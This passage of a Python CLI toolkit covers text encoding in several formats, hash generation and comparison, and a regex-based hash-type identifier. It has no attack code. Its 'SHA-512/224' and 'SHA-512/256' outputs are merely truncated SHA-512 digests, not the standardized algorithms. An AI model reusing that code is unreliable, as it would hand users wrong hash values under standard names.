        cli_manager.console.print(f"[yellow]Length: {len(result)} characters[/yellow]")
        
        # Show copy suggestion
        cli_manager.console.print(f"[dim]Copy the result above[/dim]")
    else:
        print(f"\n{operation}: {result}")
        print(f"Length: {len(result)} characters")


def display_error(operation, error):
    """Display error message with Rich formatting."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold red]{operation} Error:[/bold red]")
        cli_manager.console.print(f"[red]{error}[/red]")
    else:
        print(f"\n{operation} Error: {error}")


def multiple_formats_encoder():
    """Encode text in multiple formats simultaneously."""
    print("\n[Multiple Formats Encoder]")
    
    text = safe_input("Enter text to encode in multiple formats: ")
    if not text:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Multiple Format Encoding Results:[/bold green]")
        
        # Create table for results
        table = Table(title="Encoding Results", show_header=True, header_style="bold magenta")
        table.add_column("Format", style="cyan", no_wrap=True)
        table.add_column("Result", style="green")
        table.add_column("Length", style="yellow", justify="right")
        
        # Base64
        try:
            base64_result = base64.b64encode(text.encode()).decode()
            table.add_row("Base64", base64_result, str(len(base64_result)))
        except Exception as e:
            table.add_row("Base64", f"Error: {e}", "0")
        
        # Base32
        try:
            base32_result = base64.b32encode(text.encode()).decode()
            table.add_row("Base32", base32_result, str(len(base32_result)))
        except Exception as e:
            table.add_row("Base32", f"Error: {e}", "0")
        
        # URL
        try:
            url_result = urllib.parse.quote(text)
            table.add_row("URL", url_result, str(len(url_result)))
        except Exception as e:
            table.add_row("URL", f"Error: {e}", "0")
        
        # Hex
        try:
            hex_result = text.encode().hex()
            table.add_row("Hex", hex_result, str(len(hex_result)))
        except Exception as e:
            table.add_row("Hex", f"Error: {e}", "0")
        
        # ROT13
        try:
            rot13_result = codecs.decode(text, 'rot13')
            table.add_row("ROT13", rot13_result, str(len(rot13_result)))
        except Exception as e:
            table.add_row("ROT13", f"Error: {e}", "0")
        
        # Binary
        try:
            binary_result = ' '.join(format(ord(char), '08b') for char in text)
            table.add_row("Binary", binary_result[:50] + "..." if len(binary_result) > 50 else binary_result, str(len(binary_result)))
        except Exception as e:
            table.add_row("Binary", f"Error: {e}", "0")
        
        # HTML
        try:
            html_entities = {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'}
            html_result = text
            for char, entity in html_entities.items():
                html_result = html_result.replace(char, entity)
            table.add_row("HTML", html_result, str(len(html_result)))
        except Exception as e:
            table.add_row("HTML", f"Error: {e}", "0")
        
        cli_manager.console.print(table)
        
        # Ask if user wants to save results
        save_choice = safe_input("Save results to file? (y/n): ")
        if save_choice and save_choice.lower() in ('y', 'yes'):
            save_multiple_formats_results(text)
        
    else:
        print(f"\nMultiple Format Encoding Results:")
        print(f"Original text: {text}")
        print(f"Original length: {len(text)} characters")
        print()
        
        # Base64
        try:
            base64_result = base64.b64encode(text.encode()).decode()
            print(f"Base64: {base64_result}")
        except Exception as e:
            print(f"Base64: Error - {e}")
        
        # Base32
        try:
            base32_result = base64.b32encode(text.encode()).decode()
            print(f"Base32: {base32_result}")
        except Exception as e:
            print(f"Base32: Error - {e}")
        
        # URL
        try:
            url_result = urllib.parse.quote(text)
            print(f"URL: {url_result}")
        except Exception as e:
            print(f"URL: Error - {e}")
        
        # Hex
        try:
            hex_result = text.encode().hex()
            print(f"Hex: {hex_result}")
        except Exception as e:
            print(f"Hex: Error - {e}")
        
        # ROT13
        try:
            rot13_result = codecs.decode(text, 'rot13')
            print(f"ROT13: {rot13_result}")
        except Exception as e:
            print(f"ROT13: Error - {e}")
        
        # Binary
        try:
            binary_result = ' '.join(format(ord(char), '08b') for char in text)
            print(f"Binary: {binary_result}")
        except Exception as e:
            print(f"Binary: Error - {e}")
        
        # HTML
        try:
            html_entities = {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'}
            html_result = text
            for char, entity in html_entities.items():
                html_result = html_result.replace(char, entity)
            print(f"HTML: {html_result}")
        except Exception as e:
            print(f"HTML: Error - {e}")


def save_multiple_formats_results(original_text):
    """Save multiple format encoding results to file."""
    filename = safe_input("Enter filename (default: encoding_results.txt): ")
    if not filename:
        filename = "encoding_results.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("Multiple Format Encoding Results\n")
            f.write("=" * 40 + "\n\n")
            f.write(f"Original text: {original_text}\n")
            f.write(f"Original length: {len(original_text)} characters\n\n")
            
            # Base64
            try:
                base64_result = base64.b64encode(original_text.encode()).decode()
                f.write(f"Base64: {base64_result}\n")
            except Exception as e:
                f.write(f"Base64: Error - {e}\n")
            
            # Base32
            try:
                base32_result = base64.b32encode(original_text.encode()).decode()
                f.write(f"Base32: {base32_result}\n")
            except Exception as e:
                f.write(f"Base32: Error - {e}\n")
            
            # URL
            try:
                url_result = urllib.parse.quote(original_text)
                f.write(f"URL: {url_result}\n")
            except Exception as e:
                f.write(f"URL: Error - {e}\n")
            
            # Hex
            try:
                hex_result = original_text.encode().hex()
                f.write(f"Hex: {hex_result}\n")
            except Exception as e:
                f.write(f"Hex: Error - {e}\n")
            
            # ROT13
            try:
                rot13_result = codecs.decode(original_text, 'rot13')
                f.write(f"ROT13: {rot13_result}\n")
            except Exception as e:
                f.write(f"ROT13: Error - {e}\n")
            
            # Binary
            try:
                binary_result = ' '.join(format(ord(char), '08b') for char in original_text)
                f.write(f"Binary: {binary_result}\n")
            except Exception as e:
                f.write(f"Binary: Error - {e}\n")
            
            # HTML
            try:
                html_entities = {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'}
                html_result = original_text
                for char, entity in html_entities.items():
                    html_result = html_result.replace(char, entity)
                f.write(f"HTML: {html_result}\n")
            except Exception as e:
                f.write(f"HTML: Error - {e}\n")
            
            f.write(f"\nGenerated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[green]✓ Results saved to: {filename}[/green]")
        else:
            print(f"✓ Results saved to: {filename}")
        
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]Error saving file: {e}[/red]")
        else:
            print(f"Error saving file: {e}")


def hash_generator():
    """Enhanced hash generator with comprehensive hash types and file support."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced Hash Generator[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced Hash Generator]")
    
    while True:
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]Hash Generation Options:[/bold cyan]")
            console.print("1. [green]Text Input[/green] - Hash text strings")
            console.print("2. [green]File Input[/green] - Hash file contents")
            console.print("3. [green]Custom Hash[/green] - Generate specific hash types")
            console.print("4. [green]Hash Comparison[/green] - Compare multiple inputs")
            console.print("0. [red]Back to main menu[/red]")
        else:
            print("\nHash Generation Options:")
            print("1. Text Input - Hash text strings")
            print("2. File Input - Hash file contents")
            print("3. Custom Hash - Generate specific hash types")
            print("4. Hash Comparison - Compare multiple inputs")
            print("0. Back to main menu")
        
        choice = safe_input("Select option: ")
        if not choice or choice == "0":
            return
        
        if choice == "1":  # Text Input
            text = safe_input("Enter text to hash: ")
            if not text:
                continue
            
            if RICH_AVAILABLE:
                with Progress() as progress:
                    task = progress.add_task("Generating hashes...", total=1)
                    hashes = generate_comprehensive_hashes(text.encode())
                    progress.update(task, advance=1)
                
                display_hash_results(text, hashes, "Text Input")
            else:
                print("\nGenerating hashes...")
                hashes = generate_comprehensive_hashes(text.encode())
                display_hash_results(text, hashes, "Text Input")
        
        elif choice == "2":  # File Input
            file_path = safe_file_input("Enter file path: ")
            if not file_path:
                continue
            
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                if RICH_AVAILABLE:
                    with Progress() as progress:
                        task = progress.add_task("Generating file hashes...", total=1)
                        hashes = generate_comprehensive_hashes(file_data)
                        progress.update(task, advance=1)
                    
                    display_hash_results(f"File: {os.path.basename(file_path)}", hashes, "File Input")
                else:
                    print("\nGenerating file hashes...")
                    hashes = generate_comprehensive_hashes(file_data)
                    display_hash_results(f"File: {os.path.basename(file_path)}", hashes, "File Input")
                    
            except Exception as e:
                if RICH_AVAILABLE:
                    console.print(f"[red]Error reading file: {e}[/red]")
                else:
                    print(f"Error reading file: {e}")
        
        elif choice == "3":  # Custom Hash
            custom_hash_generator()
        
        elif choice == "4":  # Hash Comparison
            hash_comparison_tool()
        
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid option. Please try again.[/red]")
            else:
                print("Invalid option. Please try again.")


def generate_comprehensive_hashes(data):
    """Generate comprehensive hash collection including custom hashes."""
    hashes = {
        # Standard hashes
        "MD5": hashlib.md5(data).hexdigest(),
        "SHA-1": hashlib.sha1(data).hexdigest(),
        "SHA-224": hashlib.sha224(data).hexdigest(),
        "SHA-256": hashlib.sha256(data).hexdigest(),
        "SHA-384": hashlib.sha384(data).hexdigest(),
        "SHA-512": hashlib.sha512(data).hexdigest(),
        
        # Additional SHA variants
        "SHA-512/224": hashlib.sha512(data).hexdigest()[:56],  # Truncated SHA-512
        "SHA-512/256": hashlib.sha512(data).hexdigest()[:64],  # Truncated SHA-512
        
        # Custom hash combinations
        "MD5+SHA1": hashlib.md5(data).hexdigest() + hashlib.sha1(data).hexdigest(),
        "SHA256+SHA512": hashlib.sha256(data).hexdigest() + hashlib.sha512(data).hexdigest(),
        
        # Double hashing
        "MD5(MD5)": hashlib.md5(hashlib.md5(data).digest()).hexdigest(),
        "SHA256(SHA256)": hashlib.sha256(hashlib.sha256(data).digest()).hexdigest(),
        
        # Salted hashes (with common salts)
        "MD5+salt": hashlib.md5(data + b"common_salt").hexdigest(),
        "SHA256+salt": hashlib.sha256(data + b"common_salt").hexdigest(),
    }
    
    # Add Blake2 hashes if available
    try:
        import hashlib
        hashes["Blake2b"] = hashlib.blake2b(data).hexdigest()
        hashes["Blake2s"] = hashlib.blake2s(data).hexdigest()
    except:
        pass
    
    # Add SHA3 hashes if available
    try:
        hashes["SHA3-224"] = hashlib.sha3_224(data).hexdigest()
        hashes["SHA3-256"] = hashlib.sha3_256(data).hexdigest()
        hashes["SHA3-384"] = hashlib.sha3_384(data).hexdigest()
        hashes["SHA3-512"] = hashlib.sha3_512(data).hexdigest()
    except:
        pass
    
    return hashes


def display_hash_results(input_name, hashes, input_type):
    """Display hash results with Rich formatting."""
    if RICH_AVAILABLE:
        console = Console()
        
        # Create results table
        table = Table(title=f"Hash Results - {input_type}")
        table.add_column("Hash Type", style="cyan", no_wrap=True)
        table.add_column("Hash Value", style="green")
        table.add_column("Length", style="yellow", justify="right")
        
        for hash_type, hash_value in hashes.items():
            table.add_row(hash_type, hash_value, str(len(hash_value)))
        
        console.print(table)
        
        # Save option
        if console.input("\n[bold yellow]Save hashes to file? (y/n): [/bold yellow]").lower() in ('y', 'yes'):
            filename = console.input("[bold yellow]Enter filename: [/bold yellow]")
            if filename:
                try:
                    with open(filename, 'w') as f:
                        f.write(f"Original input: {input_name}\n")
                        f.write("=" * 60 + "\n")
                        for hash_type, hash_value in hashes.items():
                            f.write(f"{hash_type}: {hash_value}\n")
                    console.print(f"[green]Hashes saved to {filename}[/green]")
                except Exception as e:
                    console.print(f"[red]Error saving file: {e}[/red]")
    else:
        print(f"\nHash Results - {input_type}")
        print("=" * 60)
        print(f"Original input: {input_name}")
        print("=" * 60)
        
        for hash_type, hash_value in hashes.items():
            print(f"{hash_type:12}: {hash_value}")
        
        save_choice = safe_input("\nSave hashes to file? (y/n): ")
        if save_choice and save_choice.lower() in ('y', 'yes'):
            filename = safe_input("Enter filename: ")
            if filename:
                try:
                    with open(filename, 'w') as f:
                        f.write(f"Original input: {input_name}\n")
                        f.write("=" * 60 + "\n")
                        for hash_type, hash_value in hashes.items():
                            f.write(f"{hash_type}: {hash_value}\n")
                    print(f"Hashes saved to {filename}")
                except Exception as e:
                    print(f"Error saving file: {e}")


def custom_hash_generator():
    """Generate custom hash types based on user selection."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Custom Hash Generator[/bold blue]", border_style="blue"))
    else:
        print("\n[Custom Hash Generator]")
    
    # Available hash types
    hash_types = {
        "1": ("MD5", hashlib.md5),
        "2": ("SHA-1", hashlib.sha1),
        "3": ("SHA-256", hashlib.sha256),
        "4": ("SHA-512", hashlib.sha512),
        "5": ("Custom Salted MD5", lambda data: hashlib.md5(data + b"custom_salt")),
        "6": ("Custom Salted SHA256", lambda data: hashlib.sha256(data + b"custom_salt")),
        "7": ("Double MD5", lambda data: hashlib.md5(hashlib.md5(data).digest())),
        "8": ("Double SHA256", lambda data: hashlib.sha256(hashlib.sha256(data).digest())),
    }
    
    if RICH_AVAILABLE:
        console.print("\n[bold cyan]Available Hash Types:[/bold cyan]")
        for key, (name, _) in hash_types.items():
            console.print(f"{key}. [green]{name}[/green]")
    else:
        print("\nAvailable Hash Types:")
        for key, (name, _) in hash_types.items():
            print(f"{key}. {name}")
    
    choice = safe_input("Select hash type: ")
    if not choice or choice not in hash_types:
        return
    
    text = safe_input("Enter text to hash: ")
    if not text:
        return
    
    hash_name, hash_func = hash_types[choice]
    hash_result = hash_func(text.encode()).hexdigest()
    
    if RICH_AVAILABLE:
        console.print(f"\n[bold green]{hash_name} Hash:[/bold green]")
        console.print(f"[cyan]{hash_result}[/cyan]")
    else:
        print(f"\n{hash_name} Hash:")
        print(hash_result)


def hash_comparison_tool():
    """Compare hashes of multiple inputs."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Hash Comparison Tool[/bold blue]", border_style="blue"))
    else:
        print("\n[Hash Comparison Tool]")
    
    inputs = []
    while True:
        if RICH_AVAILABLE:
            console.print(f"\n[bold cyan]Input {len(inputs) + 1}:[/bold cyan]")
        else:
            print(f"\nInput {len(inputs) + 1}:")
        
        input_type = safe_input("Type (text/file): ").lower()
        if not input_type:
            break
        
        if input_type == "text":
            text = safe_input("Enter text: ")
            if text:
                inputs.append(("text", text, text.encode()))
        elif input_type == "file":
            file_path = safe_file_input("Enter file path: ")
            if file_path:
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    inputs.append(("file", os.path.basename(file_path), data))
                except Exception as e:
                    if RICH_AVAILABLE:
                        console.print(f"[red]Error reading file: {e}[/red]")
                    else:
                        print(f"Error reading file: {e}")
        
        if safe_input("Add another input? (y/n): ").lower() not in ('y', 'yes'):
            break
    
    if len(inputs) < 2:
        if RICH_AVAILABLE:
            console.print("[red]Need at least 2 inputs for comparison.[/red]")
        else:
            print("Need at least 2 inputs for comparison.")
        return
    
    # Generate hashes for all inputs
    hash_type = safe_input("Hash type to compare (MD5/SHA256/SHA512): ").upper()
    if hash_type not in ["MD5", "SHA256", "SHA512"]:
        hash_type = "MD5"
    
    hash_func = getattr(hashlib, hash_type.lower())
    results = []
    
    for input_type, name, data in inputs:
        hash_value = hash_func(data).hexdigest()
        results.append((input_type, name, hash_value))
    
    # Display comparison
    if RICH_AVAILABLE:
        table = Table(title=f"Hash Comparison - {hash_type}")
        table.add_column("Input Type", style="cyan")
        table.add_column("Name", style="green")
        table.add_column(f"{hash_type} Hash", style="yellow")
        
        for input_type, name, hash_value in results:
            table.add_row(input_type, name, hash_value)
        
        console.print(table)
        
        # Check for matches
        hash_values = [r[2] for r in results]
        if len(set(hash_values)) != len(hash_values):
            console.print("[bold red]⚠️  Duplicate hashes found![/bold red]")
        else:
            console.print("[bold green]✓ All hashes are unique[/bold green]")
    else:
        print(f"\nHash Comparison - {hash_type}")
        print("=" * 60)
        for input_type, name, hash_value in results:
            print(f"{input_type:8} | {name:20} | {hash_value}")
        
        # Check for matches
        hash_values = [r[2] for r in results]
        if len(set(hash_values)) != len(hash_values):
            print("\n⚠️  Duplicate hashes found!")
        else:
            print("\n✓ All hashes are unique")


def hash_identifier():
    """Enhanced hash identifier with auto-detection and comprehensive analysis."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced Hash Identifier[/bold blue]", border_style="blue"))
    else:
        print("\n[Enhanced Hash Identifier]")
    
    while True:
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]Identification Options:[/bold cyan]")
            console.print("1. [green]Single Hash Analysis[/green] - Analyze one hash")
            console.print("2. [green]Batch Hash Analysis[/green] - Analyze multiple hashes")
            console.print("3. [green]Hash Pattern Search[/green] - Search for hash patterns in text")
            console.print("4. [green]Hash Validation[/green] - Validate hash format")
            console.print("0. [red]Back to main menu[/red]")
        else:
            print("\nIdentification Options:")
            print("1. Single Hash Analysis - Analyze one hash")
            print("2. Batch Hash Analysis - Analyze multiple hashes")
            print("3. Hash Pattern Search - Search for hash patterns in text")
            print("4. Hash Validation - Validate hash format")
            print("0. Back to main menu")
        
        choice = safe_input("Select option: ")
        if not choice or choice == "0":
            return
        
        if choice == "1":  # Single Hash Analysis
            single_hash_analysis()
        elif choice == "2":  # Batch Hash Analysis
            batch_hash_analysis()
        elif choice == "3":  # Hash Pattern Search
            hash_pattern_search()
        elif choice == "4":  # Hash Validation
            hash_validation_tool()
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid option. Please try again.[/red]")
            else:
                print("Invalid option. Please try again.")


def single_hash_analysis():
    """Analyze a single hash with comprehensive identification."""
    if RICH_AVAILABLE:
        console = Console()
    else:
        print("\n[Single Hash Analysis]")
    
    hash_input = safe_input("Enter hash to identify: ")
    if not hash_input:
        return
    
    hash_input = hash_input.strip()
    analysis_result = analyze_hash_comprehensive(hash_input)
    
    if RICH_AVAILABLE:
        # Create analysis table
        table = Table(title="Hash Analysis Results")
        table.add_column("Property", style="cyan", no_wrap=True)
        table.add_column("Value", style="green")
        
        table.add_row("Input Hash", hash_input)
        table.add_row("Length", str(analysis_result['length']))
        table.add_row("Character Set", analysis_result['char_set'])
        table.add_row("Format", analysis_result['format'])
        table.add_row("Confidence", f"{analysis_result['confidence']}%")
        
        console.print(table)
        
        # Display possible types
        if analysis_result['possible_types']:
            console.print("\n[bold yellow]Possible Hash Types:[/bold yellow]")
            for hash_type, confidence in analysis_result['possible_types']:
                color = "green" if confidence > 80 else "yellow" if confidence > 50 else "red"
                console.print(f"• [{color}]{hash_type}[/{color}] (Confidence: {confidence}%)")
        else:
            console.print("\n[red]No matching hash types found.[/red]")
        
        # Display additional info
        if analysis_result['additional_info']:
            console.print("\n[bold cyan]Additional Information:[/bold cyan]")
            for info in analysis_result['additional_info']:
                console.print(f"• {info}")
    else:
        print(f"\nHash Analysis Results:")
        print("=" * 50)
        print(f"Input Hash: {hash_input}")
        print(f"Length: {analysis_result['length']}")
        print(f"Character Set: {analysis_result['char_set']}")
        print(f"Format: {analysis_result['format']}")
        print(f"Confidence: {analysis_result['confidence']}%")
        
        if analysis_result['possible_types']:
            print("\nPossible Hash Types:")
            for hash_type, confidence in analysis_result['possible_types']:
                print(f"• {hash_type} (Confidence: {confidence}%)")
        else:
            print("\nNo matching hash types found.")
        
        if analysis_result['additional_info']:
            print("\nAdditional Information:")
            for info in analysis_result['additional_info']:
                print(f"• {info}")


def analyze_hash_comprehensive(hash_input):
    """Comprehensive hash analysis with confidence scoring."""
    length = len(hash_input)
    char_set = analyze_character_set(hash_input)
    format_type = analyze_format(hash_input)
    
    possible_types = []
    additional_info = []
    
    # Hash type detection with confidence scoring
    if re.match(r'^[a-fA-F0-9]{32}$', hash_input):
        possible_types.extend([
            ("MD5", 95),
            ("MD4", 85),
            ("MD2", 80),
            ("RIPEMD128", 75)
        ])
        additional_info.append("Standard 32-character hexadecimal hash")
    
    elif re.match(r'^[a-fA-F0-9]{40}$', hash_input):
        possible_types.extend([
            ("SHA1", 95),
            ("RIPEMD160", 90),
            ("Tiger", 85)
        ])
        additional_info.append("Standard 40-character hexadecimal hash")
    
    elif re.match(r'^[a-fA-F0-9]{56}$', hash_input):
        possible_types.extend([
            ("SHA224", 95),
            ("SHA512/224", 90)
        ])
        additional_info.append("Standard 56-character hexadecimal hash")
    
    elif re.match(r'^[a-fA-F0-9]{64}$', hash_input):
        possible_types.extend([
            ("SHA256", 95),
            ("SHA512/256", 90),
            ("RIPEMD256", 85),
            ("GOST R 34.11-94", 80)
        ])
        additional_info.append("Standard 64-character hexadecimal hash")
    
    elif re.match(r'^[a-fA-F0-9]{96}$', hash_input):
        possible_types.extend([
            ("SHA384", 95)
        ])
        additional_info.append("Standard 96-character hexadecimal hash")
    
    elif re.match(r'^[a-fA-F0-9]{128}$', hash_input):
        possible_types.extend([
            ("SHA512", 95),
            ("Whirlpool", 90)
        ])
        additional_info.append("Standard 128-character hexadecimal hash")
    
    # Special format hashes
    elif hash_input.startswith('$2a$') or hash_input.startswith('$2b$') or hash_input.startswith('$2y$'):
        possible_types.extend([
            ("bcrypt", 95)
        ])
        additional_info.append("bcrypt hash with salt and cost factor")
    
    elif hash_input.startswith('$1$'):
        possible_types.extend([
            ("MD5 Crypt", 95)
        ])
        additional_info.append("MD5-based crypt hash")
    
    elif hash_input.startswith('$5$'):
        possible_types.extend([
            ("SHA256 Crypt", 95)
        ])
        additional_info.append("SHA256-based crypt hash")
    
    elif hash_input.startswith('$6$'):
        possible_types.extend([
            ("SHA512 Crypt", 95)
        ])
        additional_info.append("SHA512-based crypt hash")
    
    elif hash_input.startswith('$pbkdf2$'):
        possible_types.extend([
            ("PBKDF2", 95)
        ])
        additional_info.append("PBKDF2 key derivation function")
    
    elif hash_input.startswith('$argon2'):
        possible_types.extend([
            ("Argon2", 95)
        ])
        additional_info.append("Argon2 password hashing function")
    
    elif hash_input.startswith('$scrypt$'):
        possible_types.extend([
            ("scrypt", 95)
        ])
        additional_info.append("scrypt key derivation function")
    
    # Base64 encoded hashes
    elif re.match(r'^[A-Za-z0-9+/]{20,}={0,2}$', hash_input):
        possible_types.extend([
            ("Base64 Encoded", 90),
            ("Custom Encoding", 70)
        ])
        additional_info.append("Base64 encoded hash or data")
    
    # Custom patterns
    elif re.match(r'^[a-fA-F0-9]{16}$', hash_input):
        possible_types.extend([
            ("Custom 16-char", 60),
            ("Truncated Hash", 70)
        ])
        additional_info.append("16-character hexadecimal (possibly truncated)")
    
    elif re.match(r'^[a-fA-F0-9]{48}$', hash_input):
        possible_types.extend([
            ("Custom 48-char", 60),
            ("Truncated Hash", 70)
        ])
        additional_info.append("48-character hexadecimal (possibly truncated)")
    
    # Calculate overall confidence
    confidence = 0
    if possible_types:
        confidence = max(conf for _, conf in possible_types)
    
    return {
        'length': length,
        'char_set': char_set,
        'format': format_type,
        'confidence': confidence,
        'possible_types': sorted(possible_types, key=lambda x: x[1], reverse=True),
        'additional_info': additional_info
    }


def analyze_character_set(hash_input):
    """Analyze the character set used in the hash."""
    if re.match(r'^[a-f0-9]+$', hash_input):
        return "Lowercase hexadecimal"
    elif re.match(r'^[A-F0-9]+$', hash_input):
        return "Uppercase hexadecimal"
    elif re.match(r'^[a-fA-F0-9]+$', hash_input):
        return "Mixed case hexadecimal"
    elif re.match(r'^[A-Za-z0-9+/=]+$', hash_input):
        return "Base64"
    elif re.match(r'^[A-Za-z0-9+/]+$', hash_input):
        return "Base64 (no padding)"
    elif re.match(r'^[a-zA-Z0-9]+$', hash_input):
        return "Alphanumeric"
    else:
        return "Mixed characters"


def analyze_format(hash_input):
    """Analyze the format of the hash."""
    if hash_input.startswith('$'):
        return "Crypt format"
    elif re.match(r'^[a-fA-F0-9]+$', hash_input):
        return "Hexadecimal"
    elif re.match(r'^[A-Za-z0-9+/=]+$', hash_input):
        return "Base64"
    else:
        return "Unknown"


def batch_hash_analysis():
    """Analyze multiple hashes from file or input."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Batch Hash Analysis[/bold blue]", border_style="blue"))
    else:
        print("\n[Batch Hash Analysis]")
    
    print("1. Enter hashes manually")
    print("2. Load hashes from file")
    choice = safe_input("Select input method: ")
    
    hashes = []
    if choice == "1":
        print("Enter hashes (one per line, empty line to finish):")
        while True:
            hash_input = safe_input("Hash: ")
            if not hash_input:
                break
            hashes.append(hash_input.strip())
    elif choice == "2":
        file_path = safe_file_input("Enter file path: ")
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    hashes = [line.strip() for line in f if line.strip()]
            except Exception as e:
                if RICH_AVAILABLE:
                    console.print(f"[red]Error reading file: {e}[/red]")
                else:
                    print(f"Error reading file: {e}")
                return
    
    if not hashes:
        if RICH_AVAILABLE:
            console.print("[red]No hashes to analyze.[/red]")
        else:
            print("No hashes to analyze.")
        return
    
    # Analyze all hashes
    results = []
    for hash_input in hashes:
        analysis = analyze_hash_comprehensive(hash_input)
        results.append((hash_input, analysis))
    
    # Display results
    if RICH_AVAILABLE:
        table = Table(title="Batch Hash Analysis Results")
        table.add_column("Hash", style="cyan", no_wrap=True)
        table.add_column("Length", style="yellow", justify="right")
        table.add_column("Most Likely Type", style="green")
        table.add_column("Confidence", style="magenta", justify="right")
        
        for hash_input, analysis in results:
            most_likely = analysis['possible_types'][0][0] if analysis['possible_types'] else "Unknown"
            confidence = analysis['confidence']
            table.add_row(hash_input[:20] + "..." if len(hash_input) > 20 else hash_input, 
                         str(analysis['length']), most_likely, f"{confidence}%")
        
        console.print(table)
    else:
        print(f"\nBatch Hash Analysis Results:")
        print("=" * 80)
        for hash_input, analysis in results:
            most_likely = analysis['possible_types'][0][0] if analysis['possible_types'] else "Unknown"
            print(f"{hash_input[:30]:30} | {analysis['length']:3} | {most_likely:15} | {analysis['confidence']:3}%")


def hash_pattern_search():
    """Search for hash patterns in text or files."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Hash Pattern Search[/bold blue]", border_style="blue"))
    else:
        print("\n[Hash Pattern Search]")
    
    print("1. Search in text input")
    print("2. Search in file")
    choice = safe_input("Select search method: ")
    
    text_content = ""
    if choice == "1":
        text_content = safe_input("Enter text to search: ")
    elif choice == "2":
        file_path = safe_file_input("Enter file path: ")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    text_content = f.read()
            except Exception as e:
                if RICH_AVAILABLE:
                    console.print(f"[red]Error reading file: {e}[/red]")
                else:
                    print(f"Error reading file: {e}")
                return
    
    if not text_content:
        if RICH_AVAILABLE:
            console.print("[red]No content to search.[/red]")
        else:
            print("No content to search.")
        return
    
    # Hash patterns to search for
    patterns = {
        'MD5': r'\b[a-fA-F0-9]{32}\b',
        'SHA1': r'\b[a-fA-F0-9]{40}\b',
        'SHA256': r'\b[a-fA-F0-9]{64}\b',
        'SHA512': r'\b[a-fA-F0-9]{128}\b',
        'bcrypt': r'\$2[aby]\$\d+\$[./A-Za-z0-9]{53}',
        'MD5 Crypt': r'\$1\$[./A-Za-z0-9]{8}\$[./A-Za-z0-9]{22}',
        'SHA256 Crypt': r'\$5\$[./A-Za-z0-9]{16}\$[./A-Za-z0-9]{43}',
        'SHA512 Crypt': r'\$6\$[./A-Za-z0-9]{16}\$[./A-Za-z0-9]{86}',
        'Base64': r'\b[A-Za-z0-9+/]{20,}={0,2}\b'
    }
    
    found_hashes = {}
    for pattern_name, pattern in patterns.items():
        matches = re.findall(pattern, text_content)
        if matches:
            found_hashes[pattern_name] = matches
    
    # Display results
    if RICH_AVAILABLE:
        if found_hashes:
            console.print(f"\n[bold green]Found {sum(len(matches) for matches in found_hashes.values())} hash patterns:[/bold green]")
            for pattern_name, matches in found_hashes.items():
                console.print(f"\n[bold cyan]{pattern_name}:[/bold cyan] {len(matches)} matches")
                for i, match in enumerate(matches[:5], 1):  # Show first 5
                    console.print(f"  {i}. {match}")
                if len(matches) > 5:
                    console.print(f"  ... and {len(matches) - 5} more")
        else:
            console.print("[yellow]No hash patterns found in the content.[/yellow]")
    else:
        if found_hashes:
            print(f"\nFound {sum(len(matches) for matches in found_hashes.values())} hash patterns:")
            for pattern_name, matches in found_hashes.items():
                print(f"\n{pattern_name}: {len(matches)} matches")
                for i, match in enumerate(matches[:5], 1):  # Show first 5
                    print(f"  {i}. {match}")
                if len(matches) > 5:
                    print(f"  ... and {len(matches) - 5} more")
        else:
            print("No hash patterns found in the content.")


def hash_validation_tool():
    """Validate hash format and provide suggestions."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Hash Validation Tool[/bold blue]", border_style="blue"))
    else:
        print("\n[Hash Validation Tool]")
    
    hash_input = safe_input("Enter hash to validate: ")
    if not hash_input:
        return
    
    hash_input = hash_input.strip()
    validation_result = validate_hash_format(hash_input)
    
    if RICH_AVAILABLE:
        # Create validation table
        table = Table(title="Hash Validation Results")
        table.add_column("Check", style="cyan", no_wrap=True)
        table.add_column("Status", style="green")
        table.add_column("Details", style="yellow")
        
        for check, status, details in validation_result:
            status_color = "green" if status == "PASS" else "red"
            table.add_row(check, f"[{status_color}]{status}[/{status_color}]", details)
        
        console.print(table)
    else:
        print(f"\nHash Validation Results:")
        print("=" * 50)
        for check, status, details in validation_result:
            status_symbol = "✓" if status == "PASS" else "✗"
            print(f"{status_symbol} {check}: {details}")


def validate_hash_format(hash_input):
    """Validate hash format and return detailed results."""
    results = []
    
    # Length check
    length = len(hash_input)
    if length > 0:
        results.append(("Length Check", "PASS", f"Hash length: {length} characters"))
    else:
        results.append(("Length Check", "FAIL", "Empty hash"))
    
    # Character set check
    if re.match(r'^[a-fA-F0-9]+$', hash_input):
        results.append(("Character Set", "PASS", "Valid hexadecimal characters"))
    elif re.match(r'^[A-Za-z0-9+/=]+$', hash_input):
        results.append(("Character Set", "PASS", "Valid Base64 characters"))
    elif hash_input.startswith('$'):
        results.append(("Character Set", "PASS", "Valid crypt format"))
    else:
